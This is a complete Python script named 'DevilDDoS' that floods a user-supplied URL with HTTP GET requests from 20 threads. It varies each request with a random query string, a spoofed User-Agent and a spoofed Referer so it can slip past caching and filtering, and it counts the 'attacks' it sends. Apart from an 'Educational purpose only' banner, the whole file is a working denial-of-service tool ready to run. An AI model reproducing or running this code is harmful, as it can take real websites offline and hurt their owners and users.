import os
import requests
import threading
import random
import time

########################################
#       Educational purpose only       #
########################################

if os.name == 'nt':
    os.system("cls")
else:
    os.system("clear")

url = input("URL:  ").strip()

count_lock = threading.Lock()
count = 0

referer = [
    "https://google.it/",
    "https://facebook.com/",
    "https://duckduckgo.com/",
    "https://google.com/",
    "https://youtube.com",
    "https://yandex.com",
]

def useragent():
    # Return fixed list, do NOT append each time
    return [
        "Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152)",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)",
        "Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36",
        "Mozilla/5.0 (Windows; U; Windows NT 5.0; es-ES; rv:1.8.0.3) Gecko/20060426 Firefox/1.5.0.3",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/36.0  Mobile/15E148 Safari/605.1.15"
    ]

user_agents = useragent()

def genstr(size):
    out_str = ''
    for _ in range(size):
        code = random.randint(65, 90)
        out_str += chr(code)
    return out_str

class httpth1(threading.Thread):
    def run(self):
        global count
        while True:
            try:
                headers = {
                    'User-Agent': random.choice(user_agents),
                    'Referer': random.choice(referer)
                }
                randomized_url = url + "?" + genstr(random.randint(3, 10))
                requests.get(randomized_url, headers=headers, timeout=5)
                with count_lock:
                    count += 1
                    print(f"{count} DevilDDoS Attack Sent")
            except requests.exceptions.ConnectionError:
                print("[Server might be down!]")
            except requests.exceptions.InvalidSchema:
                print("[URL Error]")
                break
            except ValueError:
                print("[Check Your URL]")
                break
            except KeyboardInterrupt:
                print("[Canceled by User]")
                break
            except Exception as e:
                print(f"[Error]: {e}")

# Limit number of threads (e.g., 20)
thread_limit = 20
threads = []

try:
    for _ in range(thread_limit):
        t = httpth1()
        t.daemon = True  # To close threads on main exit
        t.start()
        threads.append(t)

    # Keep main thread alive to let attack continue
    while True:
        time.sleep(1)

except KeyboardInterrupt:
    print("\n[Canceled By User]")
